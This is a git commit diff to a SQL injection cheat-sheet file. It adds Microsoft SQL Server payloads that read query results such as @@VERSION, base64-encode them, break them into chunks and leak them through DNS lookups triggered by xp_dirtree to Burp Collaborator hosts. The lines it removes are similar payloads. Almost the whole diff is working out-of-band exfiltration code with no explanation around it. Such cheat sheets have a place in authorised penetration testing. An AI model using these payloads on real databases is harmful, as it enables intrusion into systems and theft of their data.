14f212b53272e165f8bd9d19af3c4ea5fb427fc5
unknown <kiven7299@gmail.com>
2021-08-25 00:24:38 +0700

    Add SQL useful commands

--- SQL/SQLi_CheatSheet.sql
+++ SQL/SQLi_CheatSheet.sql
@@ -1,10 +1,28 @@
-/* get length of command's result */
-declare @a nvarchar(max), @b nvarchar(100);set @a = (select @@VERSION); set @b = concat('\\', len(@a), '.604k9w9usevobc5n1sw5jr3u2l8jw8.burpcollaborator.net\xda'); exec master.dbo.xp_dirtree @b;
-
-/* OOB */
-declare @a nvarchar(max), @b nvarchar(100), @source VARBINARY(MAX);
-set @a = (select @@VERSION);
-set @source = CONVERT(VARBINARY(MAX), @a);
-set @b = SUBSTRING(CAST('' AS XML).value('xs:base64Binary(sql:variable("@source"))', 'varchar(max)'), 0, 20)
-set @b = concat('\\\\', len(@a), '.', @b, '.n5t1edebxv05gta4691mo88b72dy1n.burpcollaborator.net\\');
+/*==== get length of command's result ====*/
+declare @a nvarchar(max), @b nvarchar(100);
+set @a = (select @@VERSION); 
+set @b = concat('\\\\', len(@a), '.604k9w9usevobc5n1sw5jr3u2l8jw8.burpcollaborator.net\\xda');
 exec master.dbo.xp_dirtree @b;
+
+/*==== OOB ====*/
+declare @a nvarchar(max), @host nvarchar(70), @b nvarchar(200), @source VARBINARY(MAX);
+
+set @host= 'q6xy4i93uj8m48w2sn8puz76xx3ord.burpcollaborator.net';
+set @a= (select @@VERSION); -- query to executed
+
+/* base64 encode */
+set @source = CONVERT(VARBINARY(MAX), @a);
+set @a = REPLACE (CAST('' AS XML).value('xs:base64Binary(sql:variable("@source"))', 'varchar(max)'), '=', '');
+
+declare @i INT = 0, @nth INT = 0, @substr_len INT = 40;
+WHILE (@i < len(@a)) BEGIN;
+/* instructions set here */
+
+set @b = SUBSTRING(@a, @i, @substr_len);
+set @b = concat('\\', @nth + 1, '.', @b, '.', @host, '\xda');
+-- select @b;
+exec master.dbo.xp_dirtree @b; -- DNS OOB
+
+set @nth += 1;
+set @i += @substr_len; 
+END;
